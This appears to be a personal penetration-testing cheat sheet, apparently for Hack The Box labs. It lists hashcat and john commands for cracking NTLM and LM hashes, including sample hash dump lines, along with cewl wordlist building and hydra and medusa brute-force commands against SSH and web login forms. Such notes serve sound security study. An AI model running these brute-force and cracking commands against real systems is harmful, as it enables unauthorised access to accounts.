### hashcat - to find the -m value for hashes
```
hashcat --example-hashes | grep -i  krb 
```
NTLM hash crack - I have multiple hashes
```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::

sudo hashcat -m 1000 hashes-ntlm.txt /usr/share/wordlists/rockyou.txt
-----
**OR**
-----
sudo --user hashcat -m 1000 hashes-ntlm.txt /usr/share/wordlists/rockyou.txt
----
**OR**
----
sudo hashcat -m 1000 hashes-ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
```    

### Cewl
```
cewl http://<targetip>/ -m 6 -w cewl.txt
wc -l cewl.txt
john --wordlist=cewl.txt --rules --stdout > mutated.txt
wc mutated.txt
medusa -h <targetip> -u admin -P mutated.txt -M http -n 80 -m DIR:/directory/to/login/panel -T 30
```
-----------------------------------

### Hydra
```
hydra -l root -P /usr/share/wordlısts/rockyou.txt <targetip> ssh
hydra -L userlist.txt -P /usr/share/wordlısts/rockyou.txt <targetip> -s 22 ssh -V
```

### crack web passwords
http-post-form can change as user module changes
Invalid: what message does the page give for wrong creds
for parameters check with burp
```
hydra -l admin -P /usr/share/seclists/Passwords/10k_most_common.txt <targetip> http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64 
```
-----------------------------------

### Medusa
```
medusa -h <targetip> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/test -T 10
```
-----------------------------------

### Hashcat
```
# learn the hash type from hashcat.net example hashes page and pass as its m value
# or you can learn with the following command
hashcat -h | grep -i lm
hashcat -m 1600 hashes /usr/share/wordlists/rockyou.txt
```
-----------------------------------

### LM/NTLM
```
hashcat -h | grep -i lm 
hashcat -m 3000  hashes --rules --wordlist=/usr/share/wordlists/rockyou.txt
```
https://hashkiller.co.uk/

------------------------------------------

When you find some digits, check if it's 32 bit
echo -n ....... | wc -c

------------------------------------------
### John
```
john hashes.txt --rules --wordlist=/usr/share/wordlists/rockyou.txt 
```
